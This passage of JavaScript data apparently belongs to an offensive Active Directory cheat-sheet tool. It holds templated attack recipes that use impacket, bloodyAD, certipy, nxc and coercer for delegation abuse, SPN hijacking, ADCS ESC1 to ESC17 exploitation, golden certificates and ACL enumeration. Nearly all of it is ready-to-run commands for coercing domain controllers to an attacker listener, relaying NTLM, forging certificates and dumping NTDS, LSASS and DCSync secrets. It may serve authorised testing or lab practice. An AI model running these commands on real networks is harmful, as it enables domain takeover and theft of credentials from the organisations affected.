 [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'ticket'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove rbcd '{{target_host}}$' '{{computer_name}}'`,'CLEANUP: remove RBCD'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove computer '{{computer_name}}'`,'CLEANUP: delete computer']
],note:'bloodyAD can also dump the ticket it just obtained — <span class="mono">add shadowCredentials</span> works the same LDAP-first way. Useful behind SOCKS without direct SAMR.'});

R({id:'constrained-getst',cat:'deleg',title:'Constrained delegation abuse (S4U2Proxy)',desc:'An account allowed to delegate to a service can impersonate any user to that service — including Domain Admins.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'check delegation + T2A4D flag (0x1000000)'],
 [`impacket-findDelegation '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'find msDS-AllowedToDelegateTo'],
 [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with password'],
 [`impacket-getST '{{domain}}/{{user}}' -hashes ':{{nthash}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with hash'],
 [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'machine service with AES key (keytab path)'],
 [`KRB5CCNAME={{ccache}} impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'ccache of the delegating account'],
 [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn 'cifs/{{target_fqdn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{target_fqdn}}' -dc-ip {{dc_ip}}`,'altservice for local admin services'],
 [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'after SPN redirect: ticket for the DC'],
 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache`,'use the ticket']
],note:'<b>T2A4D</b> (TRUSTED_TO_AUTH_FOR_DELEGATION, 0x1000000) is required for <span class="mono">-impersonate</span> without a pre-existing forwardable user ticket — without it you get <span class="mono">KDC_ERR_BADOPTION</span>. If the delegated SPN resolves to nothing (<span class="mono">KDC_ERR_S_PRINCIPAL_UNKNOWN</span>), use the <b>SPN hijack</b> recipe: move the SPN onto the DC and request with <span class="mono">-altservice HOST/{{dc_fqdn}}</span>.'});

R({id:'spn-hijack-deleg',cat:'deleg',title:'SPN hijack — redirect constrained delegation to the DC',desc:'Constrained delegation points at a service that does not exist (or is out of reach)? Move its SPN onto the DC — the KDC then issues your S4U2Proxy ticket for the DC machine account.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'confirm delegation + T2A4D (0x1000000)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get search --filter '(servicePrincipalName={{spn}})' --attr sAMAccountName,distinguishedName`,'which object holds the target SPN?'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{dc_host}}$' --attr distinguishedName`,'get the DC object DN → dc_dn'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dn}}" "{{spn}}"`,'remove SPN from old owner (your notes)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'add SPN to the DC account (your notes)'],
 [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'your original getST — ticket now encrypted for the DC'],
 [`KRB5CCNAME={{ccache}} impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'ccache variant of your original getST'],
 [`ls -la *.ccache`,'find ticket file'],
 [`export KRB5CCNAME=$(pwd)/'{{target_user}}@HOST_{{dc_fqdn}}@{{realm}}.ccache'`,'export (adjust name)'],
 [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'DC takeover: NTDS dump'],
 [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --dpapi --sam --lsa --sccm`,'your writeup dump line'],
 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket variant'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dc_dn}}" "{{spn}}"`,'CLEANUP: remove SPN from DC'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "{{spn}}"`,'CLEANUP: restore SPN on original owner']
],note:'Requirements: write access on the DC object\'s <span class="mono">servicePrincipalName</span> (GenericWrite/GenericAll on the DC or DA) plus the delegating account\'s key (keytab/AES or hash) and T2A4D. Never leave the SPN on two objects — duplicate SPNs make the KDC resolve unpredictably; delete first, then add. Changes apply at the next ticket request (multi-DC setups: wait for replication). <span class="mono">-altservice HOST/{{dc_fqdn}}</span> rewrites the service class so SMB/LDAP on the DC accepts the ticket.'});

R({id:'unconstrained-coerce',cat:'deleg',title:'Unconstrained delegation + coercion',desc:'A machine trusted for delegation caches TGTs of users who authenticate to it. Coerce a DC and collect them.',
cmds:[
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'find unconstrained hosts'],
 [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce DC via print spooler'],
 [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce via EFSRPC'],
 [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}}`,'mass coercion (all vectors)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy`,'dump cached TGTs from LSASS'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'full LSASS dump path'],
 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'LSASS dump via ccache']
],note:'Classic chain: you have admin on an unconstrained host → coerce <span class="mono">{{dc_host}}</span> to authenticate to that host → DC machine TGT lands in LSASS → dump it → DCSync. Check spooler first: <span class="mono">nxc smb {{target_host}} -M printnightmare</span> / <span class="mono">rpcclient -c \'getprinter\'</span>. On Kali, nxc <span class="mono">-M lsassy</span> or <span class="mono">-M nanodump</span> reads LSASS without Mimikatz.'});

/* ===== ADCS / CERTIPY ===== */
R({id:'adcs-find',cat:'adcs',title:'ADCS — enumerate CAs and templates',desc:'Certipy 5.x: find vulnerable templates and CA configuration.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout`,'password auth'],
 [`certipy find -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -vulnerable -stdout`,'via NT hash'],
 [`KRB5CCNAME={{ccache}} certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -vulnerable -stdout`,'via ccache'],
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M adcs`,'nxc module'],
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -bloodhound`,'export for BloodHound']
],note:'Look for <b>ESC1/ESC6/ESC8</b> first. Template flagged with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1; CA with Web Enrollment/HTTP endpoints = ESC8 (relay); EDITF_ATTRIBUTESUBJECTALTNAME2 = ESC6. The remaining ESC1-17 paths have dedicated cards: <b>ESC2/3, ESC4, ESC5/12/14, ESC7, ESC9/16, ESC10, ESC11, ESC13, ESC15, ESC17</b> plus golden certificate.'});

R({id:'adcs-esc1',cat:'adcs',title:'ADCS — ESC1 (impersonate via UPN)',desc:'Request a certificate as any user because the template allows a supplied SAN and client auth.',
cmds:[
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'request cert as target user'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -target '{{ca_host}}'`,'if CA host unresolved'],
 [`KRB5CCNAME={{ccache}} certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'request via ccache'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → NT hash'],
 [`nxc smb {{dc_host}} -u '{{target_user}}' -H '<hash from certipy auth>' --ntds`,'DCSync with the obtained hash (DC only)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{template}}' --attr msPKI-Certificate-Name-Flag,pkiExtendedKeyUsage`,'verify template flags yourself']
],note:'If the CA requires manager approval or the template is not directly enrollable, chain ESC4/ESC7 first. <span class="mono">certipy auth</span> outputs the NT hash of the impersonated account — use it directly with PtH.'});

R({id:'adcs-esc4',cat:'adcs',title:'ADCS — ESC4 (rewrite template, then ESC1)',desc:'You can write on the template object: turn it into an ESC1 machine.',
cmds:[
 [`certipy template -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -template '{{template}}' -write-default-configuration -save-old`,'make template ESC1-able (save old config)'],
 [`KRB5CCNAME={{ccache}} certipy template -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -template '{{template}}' -write-default-configuration -save-old`,'template edit via ccache'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'exploit'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → NT hash']
],note:'Always run with <span class="mono">-save-old</span> first — it stores the original template configuration next to you, so you can restore the permissions manually afterwards (see certipy wiki). Requires WriteProperty/GenericAll on the template.'});

R({id:'adcs-esc8',cat:'adcs',title:'ADCS — ESC8 (relay to HTTP enrollment)',desc:'Relay NTLM (often coerced from a DC) to the CA web enrollment endpoint and get a DC certificate.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'coerce auth to attacker'],
 [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`,'relay to CA (no proxy)','n'],
 [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template Machine`,'generic machine template','n'],
 [`certipy auth -pfx '{{target_host}}.pfx' -dc-ip {{dc_ip}}`,'DC cert → NT hash'],
 [`nxc smb {{dc_host}} -u '{{target_user}}' -H '<DC hash>' --ntds`,'DCSync']
],note:'Coercion starts the relay: the DC machine account authenticates to your listener, ntlmrelayx forwards it to the CA and prints a base64 certificate. Decode/save as <span class="mono">{{target_host}}.pfx</span>, then <span class="mono">certipy auth</span>. HTTP (not HTTPS) enrollment is the giveaway in <span class="mono">certipy find</span>.'});

R({id:'adcs-esc2-esc3',cat:'adcs',title:'ADCS — ESC2/ESC3 (Any-Purpose / Enrollment Agent)',desc:'A template that issues an Any-Purpose or Certificate-Request-Agent certificate lets you request a certificate on behalf of a privileged user.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -iA2 'ESC2\\|ESC3'`,'spot Any-Purpose / agent templates'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'1) get the agent / any-purpose cert'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User -pfx '{{user}}.pfx' -on-behalf-of '{{netbios}}\\{{target_user}}'`,'2) request on behalf of the target'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'3) PKINIT → TGT + NT hash'],
 [`certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'agent cert via ccache']
],note:'<span class="mono">-on-behalf-of</span> needs <span class="mono">NETBIOS\\sAMAccountName</span> format. ESC2 = Any-Purpose EKU (acts as agent cert implicitly); ESC3 = Certificate Request Agent EKU. The target template (<span class="mono">User</span> in the example) must be agent-enrollable — Schema V1 templates usually are. Certipy 5.x: <span class="mono">-ns</span> replaces <span class="mono">-dc-ip</span> in some subcommands.'});

R({id:'adcs-esc7',cat:'adcs',title:'ADCS — ESC7 (Manage CA / Manage Certificates)',desc:'CA-level rights let you appoint yourself officer, approve requests and retrieve the certificate.',
cmds:[
 [`certipy ca -u '{{user}}@{{domain}}' -p '{{password}}' -ns {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -add-officer '{{user}}'`,'1) make yourself officer (Manage CA)'],
 [`certipy ca -u '{{user}}@{{domain}}' -p '{{password}}' -ns {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -enable-template 'SubCA'`,'2) publish SubCA (Manage CA)'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template SubCA -upn '{{target_user}}@{{domain}}'`,'3) request SubCA (fails → saves the key)'],
 [`certipy ca -u '{{user}}@{{domain}}' -p '{{password}}' -ns {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -issue-request 1`,'4) approve request ID'],
 [`certipy ca -u '{{user}}@{{domain}}' -p '{{password}}' -ns {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -retrieve 1`,'5) retrieve the issued cert'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'6) PKINIT → TGT + NT hash']
],note:'Step 3 is expected to fail with <span class="mono">CERTSRV_E_TEMPLATE_DENIED</span> — answer <span class="mono">y</span> to save the private key as <span class="mono">&lt;request-id&gt;.key</span>. SubCA allows enrollee-supplied subjects and is admin-only by default, hence the approve/retrieve cycle. Certipy 5: <span class="mono">-ns</span> (name server); v4 used <span class="mono">-dc-ip</span>.'});

R({id:'adcs-golden-cert',cat:'adcs',title:'ADCS — Golden Certificate (CA key backup)',desc:'With ManageCA/ManageCertificates (or the CA private key) you can back it up and forge certificates for anyone — persistence without krbtgt.',
cmds:[
 [`certipy ca -u '{{user}}@{{domain}}' -p '{{password}}' -ns {{dc_ip}} -target '{{ca_host}}' -config '{{ca_host}}\\{{ca}}' -backup`,'1) back up the CA key → CA.pfx'],
 [`certipy forge -ca-pfx '{{ca}}.pfx' -upn '{{target_user}}@{{domain}}' -sid 'S-1-5-21-...-500' -crl 'ldap:///'`,'2) forge a cert for any identity'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'3) PKINIT → TGT + NT hash'],
 [`certipy forge -ca-pfx '{{ca}}.pfx' -upn '{{target_user}}@{{domain}}' -sid 'S-1-5-21-...-500' -crl 'ldap:///' -dns '{{dc_fqdn}}'`,'4) machine identity variant (-dns)']
],note:'The CA private key is the crown jewel: forged certificates are trusted until the CA key is revoked/rebuilt (lab: never). <span class="mono">-sid</span> must be the real target SID (Administrator RID 500, DC = machine SID). Combine with ESC7 to get the backup rights.'});

R({id:'adcs-esc6',cat:'adcs',title:'ADCS — ESC6 (CA allows SAN via request attributes)',desc:'The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set: you can inject a SAN (upn/sid) into any enrollable template through request attributes.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC6'`,'confirm EDITF_ATTRIBUTESUBJECTALTNAME2'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'standalone attempt (unpatched DC)'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → TGT + NT hash'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'ESC6 + ESC9/16 template (no security extension)'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -username '{{target_user}}' -domain '{{domain}}'`,'auth with explicit identity override']
],note:'EDITF_ATTRIBUTESUBJECTALTNAME2 lets you add san:upn and san:sid request attributes even when the template does not allow enrollee-supplied subjects. If the issued certificate contains the SID security extension the KDC prefers it, so standalone ESC6 fails on patched DCs (KB5014754, StrongCertificateBindingEnforcement = 2). Combine with ESC9 (template flag) or ESC16 (CA-wide DisableExtensionList) so the extension is omitted.'});

R({id:'adcs-esc9-esc16',cat:'adcs',title:'ADCS — ESC9/ESC16 (no security extension)',desc:'ESC9: template sets CT_FLAG_NO_SECURITY_EXTENSION. ESC16: the CA disables the SID extension globally. Both let a SAN UPN win during PKINIT.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -iE 'ESC9|ESC16'`,'find affected templates and CA flags'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{victim}}' read`,'read the victim UPN'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{target_user}}' -user '{{victim}}' update`,'swap victim UPN to the target sAMAccountName'],
 [`certipy shadow -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{victim}}' auto`,'optional: victim ccache via shadow credentials'],
 [`export KRB5CCNAME=$(pwd)/'{{victim}}.ccache' && klist`,'use the victim ticket'],
 [`certipy req -k -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'request the cert as the victim identity'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{victim}}@{{domain}}' -user '{{victim}}' update`,'CLEANUP: revert the UPN'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -username '{{target_user}}' -domain '{{domain}}'`,'PKINIT with -username override'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500'`,'ESC6 combo (works at enforcement 2)'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'auth (combo path)']
],note:'Scenario A (UPN swap) requires StrongCertificateBindingEnforcement 0/1 on the DC. The ESC6 combo also works at enforcement 2 because no SID extension competes. Always revert the victim UPN afterwards or the account breaks.'});

R({id:'adcs-esc10',cat:'adcs',title:'ADCS — ESC10 (weak Schannel certificate mapping)',desc:'The target uses Schannel UPN mapping (CertificateMappingMethods 0x4), so a SAN UPN overrides the certificate SID during LDAPS authentication.',
cmds:[
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -user '{{victim}}' read`,'read the victim UPN'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{dc_host}}$@{{domain}}' -user '{{victim}}' update`,'set victim UPN to the DC machine account'],
 [`certipy shadow -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{victim}}' auto`,'optional: victim ccache'],
 [`export KRB5CCNAME=$(pwd)/'{{victim}}.ccache' && klist`,'use the victim ticket'],
 [`certipy req -k -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User`,'request the certificate'],
 [`certipy account -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -upn '{{victim}}@{{domain}}' -user '{{victim}}' update`,'CLEANUP: revert the UPN'],
 [`certipy auth -pfx '{{dc_host}}.pfx' -dc-ip {{dc_ip}} -ldap-shell`,'Schannel/LDAPS shell as the DC (adjust pfx name)']
],note:'Works independently of StrongCertificateBindingEnforcement because Schannel maps by UPN (0x4). Secure CertificateMappingMethods is 0x18. The final shell is LDAPS, not PKINIT — use it to grant rights or set RBCD, then continue normally.'});

R({id:'adcs-esc11',cat:'adcs',title:'ADCS — ESC11 (NTLM relay to CA RPC/ICPR)',desc:'The CA RPC interface lacks IF_ENFORCEENCRYPTICERTREQUEST, so coerced NTLM authentication can be relayed and turned into a certificate.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC11'`,'check for missing RPC encryption enforcement'],
 [`certipy relay -target 'rpc://{{ca_host}}' -ca '{{ca}}' -template DomainController`,'start relay (listens on SMB 445, no proxy)','n'],
 [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target '{{dc_host}}' -l {{attacker_ip}}`,'coerce the DC to authenticate at your listener'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'nxc coercion alternative'],
 [`certipy auth -pfx dc.pfx -dc-ip {{dc_ip}}`,'use the relayed DC certificate']
],note:'Port 445 must be free for Certipy; if it is blocked by a local service run <span class="mono">echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start</span>. The relayed identity must be allowed to enroll the template (DC$ for DomainController). Cleanup: none needed, but the CA can be hardened with +IF_ENFORCEENCRYPTICERTREQUEST.'});

R({id:'adcs-esc13',cat:'adcs',title:'ADCS — ESC13 (issuance policy linked to group)',desc:'A template carries an issuance policy OID whose AD object links to a privileged group, so the KDC adds that group SID to your TGT.',
cmds:[
 [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout | grep -i 'ESC13'`,'find templates with linked issuance policies'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}'`,'request the linked-policy certificate'],
 [`certipy auth -pfx '{{user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → TGT with the extra group SID'],
 [`export KRB5CCNAME=$(pwd)/'{{user}}.ccache' && klist`,'verify the ticket'],
 [`KRB5CCNAME=$(pwd)/'{{user}}.ccache' impacket-secretsdump -k -no-pass -just-dc-user '{{target_user}}' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'use the ticket (example: DCSync)']
],note:'The OID object has msDS-OIDToGroupLink pointing at a group; the KDC adds the group SID (and transitive memberships) to the TGT. Your identity stays the same, so use Kerberos-aware tooling with <span class="mono">-k</span>. No cleanup required — the certificate is legitimate.'});

R({id:'adcs-esc15',cat:'adcs',title:'ADCS — ESC15 / EKUwu (CVE-2024-49019)',desc:'An unpatched CA copies attacker-supplied application policies from the CSR into certificates of a Schema V1 template with enrollee-supplied subject.',
cmds:[
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -sid '{{domain_sid}}-500' -application-policies 'Client Authentication'`,'A) inject Client Authentication (Schannel)'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}} -ldap-shell`,'A) LDAPS shell as the target'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -application-policies 'Certificate Request Agent'`,'B) inject Certificate Request Agent'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template User -pfx '{{user}}.pfx' -on-behalf-of '{{netbios}}\\{{target_user}}'`,'B) request on behalf of the target'],
 [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'B) PKINIT → TGT + NT hash']
],note:'Requires a Schema V1 template with EnrolleeSuppliesSubject and a CA that is not patched for CVE-2024-49019 (Nov 2024). Scenario A is Schannel/LDAPS, scenario B is an ESC3-like enrollment-agent abuse over PKINIT. Workaround for defenders: add 1.3.6.1.4.1.311.21.10 to the CA DisableExtensionList.'});

R({id:'adcs-esc17',cat:'adcs',title:'ADCS — ESC17 (server-auth SAN for service impersonation)',desc:'A template allows enrollee-supplied subjects and server authentication, so you can get a TLS certificate for a service other than yours (e.g. WSUS).',
cmds:[
 [`nmap -p 8530,8531,80,443 {{target_ip}}`,'find TLS-protected services (WSUS uses 8530/8531)'],
 [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -dns '{{target_fqdn}}'`,'request a server-auth cert for the service FQDN'],
 [`certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -target '{{ca_host}}' -ca '{{ca}}' -template '{{template}}' -dns '{{target_fqdn}}'`,'same via ccache'],
 [`# then impersonate the service: WSUS -> relay incoming requests to LDAP or serve a malicious update`,'follow-up needs external tooling','n']
],note:'This yields a server-authentication certificate, not an account login — no PKINIT. Classic target is WSUS: either relay WSUS client authentication to LDAP (ntlmrelayx) or serve a malicious update. Find candidates via port scan, GPO parsing or local registry. Mitigation: disable "Enrollee supplies subject" or restrict enrollment.'});

R({id:'adcs-esc5-esc12-esc14',cat:'adcs',title:'ADCS — ESC5/ESC12/ESC14 recon (ACLs, HSM, weak mapping)',desc:'The remaining paths: write access on PKI objects (ESC5), YubiHSM-backed CA with low-priv shell (ESC12), weak altSecurityIdentities mapping (ESC14).',
cmds:[
 [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: who can edit NTAuthCertificates?'],
 [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'ESC5: template container ACLs'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'find writable PKI objects (look for Public Key Services)'],
 [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{domain_dn}}' '(altSecurityIdentities=*)' sAMAccountName altSecurityIdentities`,'ESC14: explicit certificate mappings'],
 [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{{domain_dn}}' '(msDS-OIDToGroupLink=*)' msDS-OIDToGroupLink`,'ESC13 context: linked OID groups']
],note:'<b>ESC5</b>: write rights on PKI objects (NTAuthCertificates, AIA/CDP containers, CA/template objects) let you alter trust — publishing a rogue CA in NTAuthCertificates then forging with its key (needs Windows tooling like certutil -dspublish / Set-Acl). <b>ESC12</b>: only relevant for a YubiHSM2-backed CA where a low-privileged shell on the CA can force HSM signatures — no Certipy support. <b>ESC14</b>: weak altSecurityIdentities (CN-only, generic issuer, RFC822) can be matched by a certificate you obtain — authenticate with <span class="mono">certipy auth -pfx <cert> -username <mapped user></span>.'});

/* ===== ACL / DACL ABUSE ===== */
R({id:'dacl-enum',cat:'dacl',title:'Enumerate ACLs on an object',desc:'Read the security descriptor and find abusable rights (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddSelf).',
cmds:[
 [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (user)'],
 [`KRB5CCNAME={{ccache}} impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'dacledit read via ccache'],
 [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_host}}$' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (computer)'],
